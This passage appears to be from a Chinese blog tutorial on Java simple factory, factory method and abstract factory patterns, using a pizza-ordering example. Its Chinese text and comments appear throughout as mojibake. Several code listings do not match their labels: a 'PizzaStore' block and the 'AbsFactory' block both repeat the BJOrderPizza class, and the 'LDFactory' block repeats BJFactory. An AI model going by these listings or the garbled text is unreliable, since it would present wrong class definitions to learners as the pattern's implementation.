class="hljs-keyword">do</span> &#123;<br>orderType = getType();<br>pizza = SimpleFactory.createPizza2(orderType);<br><br><span class="hljs-comment">// è¾“å‡ºpizza</span><br><span class="hljs-keyword">if</span> (pizza != <span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">// è®¢è´­æˆåŠŸ</span><br>pizza.prepare();<br>pizza.bake();<br>pizza.cut();<br>pizza.box();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>System.out.println(<span class="hljs-string">&quot; è®¢è´­æŠ«è¨å¤±è´¥ &quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-comment">// å†™ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥è·å–å®¢æˆ·å¸Œæœ›è®¢è´­çš„æŠ«è¨ç§ç±»</span><br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">BufferedReader</span> <span class="hljs-variable">strin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br>System.out.println(<span class="hljs-string">&quot;input pizza ç§ç±»:&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> strin.readLine();<br><span class="hljs-keyword">return</span> str;<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>e.printStackTrace();<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>PizzaStore</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.simplefactory.pizzastore.order;<br><br><span class="hljs-comment">//ç›¸å½“äºä¸€ä¸ªå®¢æˆ·ç«¯ï¼Œå‘å‡ºè®¢è´­</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PizzaStore</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//new OrderPizza();</span><br>      <br>      <span class="hljs-comment">//ä½¿ç”¨ç®€å•å·¥å‚æ¨¡å¼</span><br>      <span class="hljs-comment">//new OrderPizza(new SimpleFactory());</span><br>      <span class="hljs-comment">//System.out.println(&quot;~~é€€å‡ºç¨‹åº~~&quot;);</span><br>      <br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderPizza2</span>();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œæ•ˆæœ</p><p>input pizza ç§ç±»:<br />greek<br />ä½¿ç”¨ç®€å•å·¥å‚æ¨¡å¼2<br />ç»™å¸Œè…ŠæŠ«è¨ å‡†å¤‡åŸææ–™<br />å¸Œè…ŠæŠ«è¨  baking;<br />å¸Œè…ŠæŠ«è¨  cutting;<br />å¸Œè…ŠæŠ«è¨  boxing;<br />input pizza ç§ç±»:</p><h3 id="å·¥å‚æ–¹æ³•æ¨¡å¼"><a class="markdownIt-Anchor" href="#å·¥å‚æ–¹æ³•æ¨¡å¼"></a> <mark>å·¥å‚æ–¹æ³•æ¨¡å¼</mark></h3><p>çœ‹ä¸€ä¸ªæ–°çš„éœ€æ±‚</p><p>æŠ«è¨é¡¹ç›®æ–°çš„éœ€æ±‚ï¼šå®¢æˆ·åœ¨ç‚¹æŠ«è¨æ—¶ï¼Œå¯ä»¥ç‚¹<strong>ä¸åŒå£å‘³çš„æŠ«è¨</strong>ï¼Œæ¯”å¦‚ åŒ—äº¬çš„å¥¶é…ª pizzaã€åŒ—äº¬çš„èƒ¡æ¤’ pizza æˆ–è€…æ˜¯ä¼¦æ•¦çš„å¥¶é…ª pizzaã€ä¼¦æ•¦çš„èƒ¡æ¤’ pizzaã€‚</p><ol><li><p>æ€è·¯ 1</p><p>ä½¿ç”¨<strong>ç®€å•å·¥å‚æ¨¡å¼</strong>ï¼Œåˆ›å»º<strong>ä¸åŒçš„ç®€å•å·¥å‚ç±»</strong>ï¼Œæ¯”å¦‚ BJPizzaSimpleFactoryã€LDPizzaSimpleFactory ç­‰ç­‰.ä»å½“å‰è¿™ä¸ªæ¡ˆä¾‹æ¥è¯´ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯è€ƒè™‘åˆ°é¡¹ç›®çš„è§„æ¨¡ï¼Œä»¥åŠè½¯ä»¶çš„å¯ç»´æŠ¤æ€§ã€å¯æ‰©å±•æ€§å¹¶ä¸æ˜¯ç‰¹åˆ«å¥½</p></li><li><p>æ€è·¯ 2</p><p>ä½¿ç”¨å·¥å‚æ–¹æ³•æ¨¡å¼</p></li></ol><blockquote><p>å·¥å‚æ–¹æ³•æ¨¡å¼ä»‹ç»</p></blockquote><ol><li><p>å·¥å‚æ–¹æ³•æ¨¡å¼è®¾è®¡æ–¹æ¡ˆï¼šå°†æŠ«è¨é¡¹ç›®çš„å®ä¾‹åŒ–åŠŸèƒ½æŠ½è±¡æˆæŠ½è±¡æ–¹æ³•ï¼Œåœ¨ä¸åŒçš„å£å‘³ç‚¹é¤å­ç±»ä¸­å…·ä½“å®ç°ã€‚</p></li><li><p>å·¥å‚æ–¹æ³•æ¨¡å¼ï¼š<strong>å®šä¹‰äº†ä¸€ä¸ªåˆ›å»ºå¯¹è±¡çš„æŠ½è±¡æ–¹æ³•</strong>ï¼Œç”±å­<strong>ç±»å†³å®šè¦å®ä¾‹åŒ–çš„ç±»</strong>ã€‚å·¥å‚æ–¹æ³•æ¨¡å¼å°†<strong>å¯¹è±¡çš„å®ä¾‹åŒ–æ¨è¿Ÿåˆ°å­ç±»</strong>ã€‚</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224165136437.png" alt="image-20221224165136437" /></p><p><strong>ä»£ç </strong></p><p><code>OrderPizza</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.factorymethod.pizzastore.order;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.Pizza;<br><br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br><br>   <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªæŠ½è±¡æ–¹æ³•ï¼ŒcreatePizza , è®©å„ä¸ªå·¥å‚å­ç±»è‡ªå·±å®ç°</span><br>   <span class="hljs-keyword">abstract</span> Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span>;<br>   <br>   <span class="hljs-comment">// æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderPizza</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      String orderType; <span class="hljs-comment">// è®¢è´­æŠ«è¨çš„ç±»å‹</span><br>      <span class="hljs-keyword">do</span> &#123;<br>         orderType = getType();<br>         pizza = createPizza(orderType); <span class="hljs-comment">//æŠ½è±¡æ–¹æ³•ï¼Œç”±å·¥å‚å­ç±»å®Œæˆ</span><br>         <span class="hljs-comment">//è¾“å‡ºpizza åˆ¶ä½œè¿‡ç¨‹</span><br>         pizza.prepare();<br>         pizza.bake();<br>         pizza.cut();<br>         pizza.box();<br>         <br>      &#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>);<br>   &#125;<br><br>   <br><br>   <span class="hljs-comment">// å†™ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥è·å–å®¢æˆ·å¸Œæœ›è®¢è´­çš„æŠ«è¨ç§ç±»</span><br>   <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">strin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br>         System.out.println(<span class="hljs-string">&quot;input pizza ç§ç±»:&quot;</span>);<br>         <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> strin.readLine();<br>         <span class="hljs-keyword">return</span> str;<br>      &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>         e.printStackTrace();<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>      &#125;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>LDOrderPizza</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.factorymethod.pizzastore.order;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.LDCheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.LDPepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.Pizza;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDOrderPizza</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br><br>   <br>   <span class="hljs-meta">@Override</span><br>   Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span> &#123;<br>   <br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span>(orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LDCheesePizza</span>();<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LDPepperPizza</span>();<br>      &#125;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>BJOrderPizza</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.factorymethod.pizzastore.order;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.BJCheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.BJPepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.Pizza;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BJOrderPizza</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br><br>   <br>   <span class="hljs-meta">@Override</span><br>    Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span> &#123;<br>   <br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span>(orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJCheesePizza</span>();<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJPepperPizza</span>();<br>      &#125;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>PizzaStore</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.factorymethod.pizzastore.order;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.BJCheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.BJPepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.Pizza;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BJOrderPizza</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br><br>   <br>   <span class="hljs-meta">@Override</span><br>    Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span> &#123;<br>   <br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span>(orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJCheesePizza</span>();<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJPepperPizza</span>();<br>      &#125;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œæ•ˆæœ</p><p>input pizza ç§ç±»:<br />pepper<br />åŒ—äº¬çš„èƒ¡æ¤’pizza å‡†å¤‡åŸææ–™<br />åŒ—äº¬çš„èƒ¡æ¤’pizza baking;<br />åŒ—äº¬çš„èƒ¡æ¤’pizza cutting;<br />åŒ—äº¬çš„èƒ¡æ¤’pizza boxing;<br />input pizza ç§ç±»:</p><h3 id="æŠ½è±¡å·¥å‚æ¨¡å¼"><a class="markdownIt-Anchor" href="#æŠ½è±¡å·¥å‚æ¨¡å¼"></a> <mark>æŠ½è±¡å·¥å‚æ¨¡å¼</mark></h3><ol><li><p>æŠ½è±¡å·¥å‚æ¨¡å¼ï¼šå®šä¹‰äº†ä¸€ä¸ª <strong>interface ç”¨äºåˆ›å»ºç›¸å…³æˆ–æœ‰ä¾èµ–å…³ç³»çš„å¯¹è±¡ç°‡</strong>ï¼Œè€Œæ— éœ€æŒ‡æ˜å…·ä½“çš„ç±»</p></li><li><p>æŠ½è±¡å·¥å‚æ¨¡å¼å¯ä»¥å°†ç®€å•å·¥å‚æ¨¡å¼å’Œå·¥å‚æ–¹æ³•æ¨¡å¼è¿›è¡Œæ•´åˆã€‚</p></li><li><p>ä»è®¾è®¡å±‚é¢çœ‹ï¼ŒæŠ½è±¡å·¥å‚æ¨¡å¼å°±æ˜¯å¯¹ç®€å•å·¥å‚æ¨¡å¼çš„æ”¹è¿›(æˆ–è€…ç§°ä¸ºè¿›ä¸€æ­¥çš„æŠ½è±¡)ã€‚</p></li><li><p>å°†å·¥å‚æŠ½è±¡æˆ<strong>ä¸¤å±‚</strong>ï¼Œ<strong>AbsFactory(æŠ½è±¡å·¥å‚)</strong> å’Œ <strong>å…·ä½“å®ç°çš„å·¥å‚å­ç±»</strong>ã€‚ç¨‹åºå‘˜å¯ä»¥æ ¹æ®åˆ›å»ºå¯¹è±¡ç±»å‹ä½¿ç”¨å¯¹åº”çš„å·¥å‚å­ç±»ã€‚è¿™æ ·å°†å•ä¸ªçš„ç®€å•å·¥å‚ç±»å˜æˆäº†å·¥å‚ç°‡ï¼Œæ›´åˆ©äºä»£ç çš„ç»´æŠ¤å’Œæ‰©å±•ã€‚</p></li><li><p>ç±»å›¾</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224171144291.png" alt="image-20221224171144291" /></p><p><strong>ä»£ç </strong></p><p><code>AbsFactory</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.factorymethod.pizzastore.order;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.BJCheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.BJPepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.factorymethod.pizzastore.pizza.Pizza;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BJOrderPizza</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br><br>   <br>   <span class="hljs-meta">@Override</span><br>    Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span> &#123;<br>   <br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span>(orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJCheesePizza</span>();<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJPepperPizza</span>();<br>      &#125;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>BJFactory</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.absfactory.pizzastore.order;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.absfactory.pizzastore.pizza.BJCheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.absfactory.pizzastore.pizza.BJPepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.absfactory.pizzastore.pizza.Pizza;<br><br><span class="hljs-comment">//è¿™æ˜¯å·¥å‚å­ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BJFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AbsFactory</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;~ä½¿ç”¨çš„æ˜¯æŠ½è±¡å·¥å‚æ¨¡å¼~&quot;</span>);<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span>(orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJCheesePizza</span>();<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>))&#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJPepperPizza</span>();<br>      &#125;<br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>LDFactory</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.absfactory.pizzastore.order;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.absfactory.pizzastore.pizza.BJCheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.absfactory.pizzastore.pizza.BJPepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.absfactory.pizzastore.pizza.Pizza;<br><br><span class="hljs-comment">//è¿™æ˜¯å·¥å‚å­ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BJFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AbsFactory</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;~ä½¿ç”¨çš„æ˜¯æŠ½è±¡å·¥å‚æ¨¡å¼~&quot;</span>);<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">if</span>(orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJCheesePizza</span>();<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>))&#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BJPepperPizza</span>();<br>      &#125;<br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>OrderPizza</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.absfactory.pizzastore.order;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.absfactory.pizzastore.pizza.Pizza;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br><br>   AbsFactory factory;<br><br>   <span class="hljs-comment">// æ„é€ å™¨</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderPizza</span><span class="hljs-params">(AbsFactory factory)</span> &#123;<br>      setFactory(factory);<br>   &#125;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFactory</span><span class="hljs-params">(AbsFactory factory)</span> &#123;<br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">orderType</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">// ç”¨æˆ·è¾“å…¥</span><br>      <span class="hljs-built_in">this</span>.factory = factory;<br>      <span class="hljs-keyword">do</span> &#123;<br>         orderType = getType();<br>         <span class="hljs-comment">// factory å¯èƒ½æ˜¯åŒ—äº¬çš„å·¥å‚å­ç±»ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¼¦æ•¦çš„å·¥å‚å­ç±»</span><br>         pizza = factory.createPizza(orderType);<br>         <span class="hljs-keyword">if</span> (pizza != <span 